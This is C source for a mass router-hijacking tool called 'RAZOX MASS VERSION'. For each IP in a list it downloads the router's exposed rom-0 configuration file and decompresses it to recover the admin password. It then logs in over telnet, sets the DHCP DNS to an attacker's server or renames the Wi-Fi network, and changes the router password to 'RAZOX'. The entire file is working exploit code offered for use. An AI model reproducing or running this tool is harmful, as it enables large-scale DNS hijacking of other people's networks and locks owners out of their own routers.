#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <curl/curl.h>
#include <winsock2.h>
#include <string.h>
#include <windows.h>
#include <dirent.h>
//functions declaration
int download_rom();
int ip_loop ();
int fail();
int count();
int ROUTER_HACK(char pswrd[],char addr[]);
int DNS();
int SSID();
int CWMP();
int INFO();
int PASS();
int RAZOX();
int HELP();

//global variabls
char pass[20] = "";
char cmd1[50] = "";
char cmd2[50] = "sys password RAZOX\n";
int hacked = 0;
int nothacked = 0;

struct HttpFile { const char *filename;    FILE *stream; };
typedef unsigned short U16;
typedef unsigned long U32;
typedef unsigned char UCHAR;

typedef struct _lzs_struct{
	UCHAR	*Src;
	UCHAR	*Dest;
	UCHAR	*DestNew;
	U32		SrcPos;
} lzs_s;

#ifdef _MSC_VER
#pragma pack(push, 1)
typedef struct romfile_struct {
	U16 version;
	U16 size;
	U16 offset;
	char name[14];
} rom_s;
#pragma pack(pop)
#endif

#ifdef __GNUC__
typedef struct __attribute__((packed)) romfile_struct {
	U16 version;
	U16 size;
	U16 offset;
	char name[14];
} rom_s;

#define __FUNCTION__ __func__
#define _snprintf snprintf
#endif

U16 mbs(U16 x){
	UCHAR *s = (UCHAR*)&x;
	return (U16)(s[0] << 8 | s[1]);
}

U32 GetBits(lzs_s *Lzs, int NumOfBits){
	U32		Out = 0;
	int		BytePos, BitPos;

	if(NumOfBits > 0)
	{
		BytePos		=	Lzs->SrcPos / 8;
		BitPos		=	Lzs->SrcPos % 8;

		Out			=	(Lzs->Src[BytePos] << 16) | (Lzs->Src[BytePos + 1] << 8) | Lzs->Src[BytePos + 2];
		Out			=	(Out >> (24 - NumOfBits - BitPos)) & ((1L << NumOfBits) - 1);
		Lzs->SrcPos	+=	NumOfBits;
	}

	return Out;
}

int GetLen(lzs_s *Lzs){

	int Bits;
	int Length=2;

	do
	{
		Bits	=	GetBits(Lzs, 2);
		Length	+=	Bits;
	}
	while((Bits == 3) && (Length < 8));

	if (Length == 8)
	{
		do
		{
			Bits	=	GetBits(Lzs, 4);
			Length	+=	Bits;
		}
		while(Bits == 15);
	}

	return Length;
}

int LzsUnpack(lzs_s *Lzs){
	int			Tag, Offset, Len;
	UCHAR		*d, *Dict;

	d			=	Lzs->Dest;

	// unpacking loop
	while (1)
	{

		Tag		=	GetBits(Lzs, 1);

		if (Tag == 0)
		{
			// uncompressed byte
			*d++	=	(UCHAR)GetBits(Lzs, 8);
			continue;
		}


		Tag		=	GetBits(Lzs, 1);
		Offset	=	GetBits(Lzs, (Tag == 1) ? 7:11);

		if ((Tag == 1) && (Offset == 0))
		{
			// end of stream?
			//printf("End of stream\r\n");
			break;
		}


		Dict	=	&d[-Offset];

		if (Dict < Lzs->Dest)
		{
			printf("%s: underflow error, offset=0x%08x tag=0x%08x\r\n",
				__FUNCTION__,
				Offset,
				Tag);
			break;
		}


		Len		=	GetLen(Lzs);
		while (Len--)
			*d++	=	*Dict++;
	}

	Lzs->DestNew		=	d;
	return 0;
}

char* LzsUnpackFile(char *FileName){


	int			i;
	FILE		*SrcFile;
	UCHAR		*Src, *Dest, *Base, *d, *s;
	long		FileSize;
	lzs_s		Lzs;
	rom_s		Roms;

	memset(&Lzs, 0, sizeof(lzs_s));
	SrcFile		=	fopen(FileName, "rb");

	if (!SrcFile)
	{
		printf("RSK>%s: unable to open file \"%s\"\r\n", __FUNCTION__, FileName);
		return "--+--";
	}

	fseek(SrcFile, 0, SEEK_END);
	FileSize = ftell(SrcFile);
	fseek(SrcFile, 0, SEEK_SET);

	// warning: this can overflow
#define DEST_SIZE	FileSize*50
	Src		=	(UCHAR*)malloc(FileSize);
	Dest	=	(UCHAR*)malloc(DEST_SIZE);

	if (!Src || !Dest)
	{
		printf("RSK>%s: unable to allocate memory, FileSize = 0x%ld\r\n", __FUNCTION__, FileSize);
		fclose(SrcFile);
		return "--+--";
	}

	d		=	Dest;
	s		=	Src;

	memset(Dest, 0, DEST_SIZE);
	fread(Src, 1, FileSize, SrcFile);
	fclose(SrcFile);

#define BASE_OFFSET		0x2000
#define PASS_OFFSET		0x14
#define NAME_OFFSET		0x54
#define PHON_NUMBER     0x3B1B

	i				=	0;
	Base			=	s + BASE_OFFSET;


	while (1)
	{
		memcpy(&Roms, Base, sizeof(rom_s));
		Roms.size	=	mbs(Roms.size);
		Roms.offset	=	mbs(Roms.offset);

		if ((Base > (Src + FileSize)) || (Roms.name[0] == 0))
		{
			//printf("End of file reached.\r\n");
			break;
		}

		//printf("[%02d] rom_header block offset=0x%08x size=0x%08x name=%s \r\n",
		//	i++,
		//	Roms.offset,
		//	Roms.size,
		//	Roms.name);


		if (strcmp((char*)&Roms.name, "autoexec.net") == 0)
		{
			Lzs.Dest	=	d;
			Lzs.Src		=	s + BASE_OFFSET + Roms.offset + 0xC + 4;
			Lzs.SrcPos	=	0;
			LzsUnpack(&Lzs);
            //printf("\a");
			//printf("Router Password is: %s\r\n", (Lzs.Dest + PASS_OFFSET));
			//printf("Router Name is: %s\r\n", (Lzs.Dest + 84));

			sprintf(pass,"%s\n\0",(Lzs.Dest + PASS_OFFSET));
		}
		else
		{
			//printf ("Not the one we wanted, skipping.\r\n");

		}
		Base +=	sizeof(rom_s);
	}
	free(Dest);
	free(Src);

	if(pass){
            //printf("------------------------------\n");
            //printf("RSK>password found !:%s\n",pass);
            //printf("-------------------------------\n");
    count();
    return pass;
	}else{
    printf("RSK>Error can't get the password !\n");
	return "Null";
	}

}

int main(int argc, char *argv[]){
//LOGO






printf("    _____ _____ _____ _____ __ __       _____ _____ _____ _____               \n");
printf("   | __  |  _  |__   |     |  |  |     |     |  _  |   __|   __|              \n");
printf("   |    -|     |   __|  |  |-   -|     | | | |     |__   |__   |              \n");
printf("   |__|__|__|__|_____|_____|__|__|     |_|_|_|__|__|_____|_____| VERSION 5.0  \n\n");
printf("                        _________________________ \n");
printf("                           RAZOX MASS VERSION\n");
printf("                              By MOUSSA MBS \n\n");



        RAZOX();


    return 0;
}

int RAZOX(){
        printf("    [1]:Mass DNS changer\n");
        printf("    [2]:Mass SSID Changer\n");
        printf("    [3]:Mass password changer \n");
        printf("    [4]:Mass Command-line \n");
        printf("    [5]:Mass router RESET \n");
        printf("    [6]:Mass router [breaker] *dangerous \n");
        printf("    [7]:CWMP Monitoring (Slave-Collector)(coming soon)\n");
        printf("    [8:Information Gathering (coming soon)\n");
        printf("    [9]:Help ?\n\n");

    command:
    printf("Enter a command: ");
    int n;
    fseek(stdin,0,SEEK_END);
    scanf("%d", &n);

    if(n==1){DNS();
    }else if(n==2){SSID();
    }else if(n==3){PASS();
    }else if(n==4){CWMP();
    }else if(n==5){INFO();
    }else if(n==6){HELP();
    }else {
        printf("BAD command!\n");
        goto command;
        }

    }

int DNS(){
    char f[255];
    char ip[32];
    printf("\n[1] DNS Hijacking \n\n");
    printf("Enter the IPs list file :");
    scanf("%s", &f);
    printf("Enter your DNS server IP :");
    scanf("%s", &ip);
    sprintf(cmd1,"set lan dhcpdns %s 8.8.8.8\n",ip);
    if(f!=""&&ip!="")ip_loop(f);
}

int SSID(){
    char f[255];
    char name[32];
    printf("    [2]:WIFI Name Changer\n");
    printf("Enter the IPs list file :");
    scanf("%s", &f);
    printf("Enter WIFI name :");
    scanf("%s", &name);
    sprintf(cmd1,"r ssid %s\n",name);
    if(f!=""&&name!="")ip_loop(f);
}

int CWMP(){
printf("CWMP !\n");
}

int PASS(){
printf("PASS !\n");
}

int INFO(){
printf("INFO !\n");
}

int HELP(){
printf("contact me for for info : fb.com/poustich\n");
}


static size_t makeit(void *buffer, size_t size, size_t nmemb, void *stream){


  struct HttpFile *out=(struct HttpFile *)stream;
  if(out && !out->stream) {
    /* open file for writing */
    out->stream=fopen(out->filename, "wb");
    if(!out->stream)
      return -1; /* failure, can't open file to write */
  }
  return fwrite(buffer, size, nmemb, out->stream);
}

int download_rom(char *ip){
  CURL *curl;
  CURLcode res;
  char  url[30] = "" ;
  char    f[30] = "" ;
  char   *ps = "" ;
    /*
  char   ip[20] = "" ;
  printf("Enter the ip:");
  scanf("%s",ip);
  */
  sprintf(f,"romz\\%s.RZX",ip);
  sprintf(url,"http://%s/rom-0",ip);

  struct HttpFile HttpFile={f,NULL};
  curl_global_init(CURL_GLOBAL_DEFAULT);
  curl = curl_easy_init();

  //printf(">>trying to hack :%s\n",ip);

  if(curl) {
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, makeit);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &HttpFile);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10);

    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    if (res == CURLE_OK){
            ps = LzsUnpackFile(f);
            if(ps!= "Null"){
            ROUTER_HACK(ps,ip);
            //printf(ps);
            printf("[OK]%s:%s\r" ,ip,ps);
            }else{
            printf("Error decompressing the file !\n");
            fail();
            }
    }else{
        fail();
        if(HttpFile.stream) fclose(HttpFile.stream);
        curl_global_cleanup();
       //download_rom();
    }

  }else{

      if(HttpFile.stream) fclose(HttpFile.stream);
      curl_global_cleanup();
      fail();
      //download_rom();
  }

  if(HttpFile.stream) fclose(HttpFile.stream);
  curl_global_cleanup();
  //download_rom();

  return 0;
}

int ROUTER_HACK(char password[],char ip[]){
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char server_reply[2000];
    int recv_size;


    //initialise the connection
    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
    {
        return 1;
    }
    //Create a socket
    if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
    {
        //printf("Could not create socket : %d" , WSAGetLastError());
    }

    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_family = AF_INET;
    server.sin_port = htons( 23 );

    //Connect to remote server
    if (connect(s , (struct sockaddr *)&server , sizeof(server)) < 0)
    {
        puts("Connect error");
        fail();
        return 1;
    }
    //sprintf("%s\n",password);
    send(s,password,strlen(password),0);
    //Sleep(500);
    send(s,cmd1,strlen(cmd1),0);
    Sleep(100);
    send(s,cmd2,strlen(cmd2),0);
    Sleep(100);

    //Receive a reply from the server
    if((recv_size = recv(s , server_reply , 2000 , 0)) != SOCKET_ERROR)
    {
      server_reply[recv_size] = '\0';
      //puts(server_reply);
    }
    shutdown(s,2);
    return 0;
}

int ip_loop (char file[]){
FILE *f;
char old[20];
if(f = fopen(file,"r")){printf("File opened [OK] \nLoading the ip list [OK]\n");}
while(!feof(f))
{
    if (fgets(old,20,f))
        {
        download_rom(strtok(old,"\n"));
    }
}
}

int fail(){

    nothacked++;
}

int count(){
    hacked++;
}

